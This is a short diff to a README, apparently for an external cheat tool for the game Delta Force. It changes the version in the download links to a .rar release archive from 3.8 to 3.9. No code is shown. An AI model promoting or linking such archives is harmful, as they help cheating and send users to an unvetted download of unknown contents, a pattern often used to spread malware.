@@ -33,9 +33,9 @@
 
 ### ⬇️ Download
 
-Get the latest release from the **[Releases](https://github.com/exithostspark/Delta-Force-External/releases/download/Delta-Force3.8/Delta-Force3.8.rar)** tab.
+Get the latest release from the **[Releases](https://github.com/exithostspark/Delta-Force-External/releases/download/Delta-Force3.9/Delta-Force3.9.rar)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/exithostspark/Delta-Force-External/releases/download/Delta-Force3.8/Delta-Force3.8.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/exithostspark/Delta-Force-External/releases/download/Delta-Force3.9/Delta-Force3.9.rar)
 
 ---
 
